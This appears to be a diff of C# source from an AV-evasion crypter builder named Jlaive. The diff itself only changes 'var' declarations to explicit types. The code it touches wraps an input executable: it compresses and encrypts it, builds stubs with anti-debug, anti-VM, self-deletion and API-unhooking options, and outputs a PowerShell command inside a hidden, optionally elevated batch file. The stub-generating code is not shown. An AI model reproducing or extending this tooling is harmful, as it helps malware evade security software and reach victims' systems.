@@ -71,7 +71,7 @@ namespace Jlaive
 
             var stubgen = new StubGen(key, iv);
             var payload = File.ReadAllBytes(input);
-            var isnetasm = IsAssembly(input);
+            bool isnetasm = IsAssembly(input);
 
             if (isnetasm)
             {
@@ -83,8 +83,8 @@ namespace Jlaive
             payload = Compress(payload);
 
             log.Items.Add("Creating stubs...");
-            var stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, unhookAPI.Checked, !isnetasm);
-            var stub2 = stubgen.CreateBCS();
+            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, unhookAPI.Checked, !isnetasm);
+            string stub2 = stubgen.CreateBCS();
 
             log.Items.Add("Building stubs...");
             var compiler = new Compiler
@@ -92,7 +92,7 @@ namespace Jlaive
                 References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" },
                 Resources = bindedFiles.Items.Cast<string>().ToArray()
             };
-            var result = compiler.Build(stub);
+            JCompilerResult result = compiler.Build(stub);
             var stubbytes = result.AssemblyBytes;
             compiler = new Compiler
             {
@@ -114,14 +114,14 @@ namespace Jlaive
             Patcher.AddResources(ref stubbytes, embeddedresources.ToArray());
 
             log.Items.Add("Encrypting stubs...");
-            var stub_enc = Encrypt(Compress(stubbytes), key, iv);
-            var stub2_enc = Encrypt(Compress(stubbytes2), key, iv);
+            byte[] stub_enc = Encrypt(Compress(stubbytes), key, iv);
+            byte[] stub2_enc = Encrypt(Compress(stubbytes2), key, iv);
 
             log.Items.Add("Creating PowerShell command...");
-            var pscommand = stubgen.CreatePS();
+            string pscommand = stubgen.CreatePS();
 
             log.Items.Add("Creating batch file...");
-            var content = stubgen.CreateBat(pscommand, stub_enc, stub2_enc, hidden.Checked, runas.Checked);
+            string content = stubgen.CreateBat(pscommand, stub_enc, stub2_enc, hidden.Checked, runas.Checked);
 
             var sfd = new SaveFileDialog()
             {
